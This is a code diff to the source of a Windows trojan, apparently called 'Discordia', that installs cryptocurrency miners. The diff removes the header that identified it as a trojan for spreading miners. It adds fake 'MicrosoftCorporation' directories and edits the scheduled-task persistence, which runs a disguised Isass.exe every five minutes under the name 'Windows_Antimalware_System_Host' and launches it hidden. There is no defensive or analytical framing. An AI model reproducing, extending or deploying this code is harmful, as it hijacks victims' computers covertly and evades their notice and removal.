@@ -1,18 +1,4 @@
-﻿/*
-	# Discordia
-	Discordia it's trojan for dissemination miners. Discordia written in C / C++.
-
-	## Features
-	* Hiding miner files
-	* Prevents closing of miner (Windows 7 and older)
-	*
-
-	## Author
-	Alexandr Foxovsky (foxovsky.me)
-
-*/
-
-#include "stdafx.h"
+﻿#include "stdafx.h"
 #include <windows.h>
 #include <iostream>
 #include <direct.h>
@@ -41,6 +27,7 @@ void Install()
 		//fake dirs
 		CreateDirectory(L"C:\\ProgramData\\MicrosoftCorporation\\DRM", NULL);
 		CreateDirectory(L"C:\\ProgramData\\MicrosoftCorporation\\Network", NULL);
+		CreateDirectory(L"C:\\ProgramData\\MicrosoftCorporation\\Network\\platforms", NULL);
 		CreateDirectory(L"C:\\ProgramData\\MicrosoftCorporation\\Windows NT", NULL);
 		CreateDirectory(L"C:\\ProgramData\\MicrosoftCorporation\\Search", NULL);
 		CreateDirectory(L"C:\\ProgramData\\MicrosoftCorporation\\Search\\Data", NULL);
@@ -69,10 +56,7 @@ void Install()
 		system("del CreateShortcut.vbs");
 
 		// add to autoload part 3
-		system("powershell.exe SCHTASKS.exe /Create /SC MINUTE /TN \"Windows_Antimalware_System_Host\" /TR C:\\ProgramData\\MicrosoftCorporation\\Windows\\SystemData\\Isass.exe /F");
-
-		// create non-file malware
-		system("powershell.exe SCHTASKS.exe /Create /SC MINUTE /TN \"Windows_Task_Host\" /TR \"C:\\Windows\\System32\\cmd.exe /c C:\\ProgramData\\MicrosoftCorporation\\Windows\\SystemData\\Isass.exe\"  /F");
+		system("powershell.exe SCHTASKS.exe /Create /SC MINUTE /MO 5 /TN \"Windows_Antimalware_System_Host\" /TR C:\\ProgramData\\MicrosoftCorporation\\Windows\\SystemData\\Isass.exe /F");
 
 		// starting malware
 		ShellExecute(NULL, 0, _T("C:\\ProgramData\\MicrosoftCorporation\\Windows\\SystemData\\Isass.exe"), 0, 0, SW_HIDE);
